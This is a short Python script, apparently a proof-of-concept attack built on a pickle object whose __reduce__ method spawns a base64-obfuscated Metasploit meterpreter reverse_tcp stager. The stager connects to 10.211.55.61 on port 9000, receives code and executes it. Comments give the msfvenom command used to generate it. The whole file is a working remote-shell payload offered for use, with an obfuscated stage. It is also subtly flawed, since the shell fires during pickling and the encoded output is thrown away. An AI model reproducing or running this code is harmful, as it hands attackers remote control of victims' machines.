# -*- coding: utf-8 -*-

import base64
import pickle


class MyLittleBastard(object):
	def __reduce__(self):

		import subprocess, sys

		# Metasploit shell: python/meterpreter/reverse_tcp
		# Metasploit command: msfvenom -p python/meterpreter/reverse_tcp lhost=10.211.55.61 lport=9000 -f raw

		# Run reverse shell

		subprocess.Popen(["python", "-c",
		                  "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}["
		                  "sys.version_info[0]]("
		                  "'aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxMC4yMTEuNTUuNjEnLDkwMDApKQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK')))"])

		return self.__class__, tuple(),


def main():
	base64.b64encode(pickle.dumps(MyLittleBastard()))


if __name__ == '__main__':
	main()
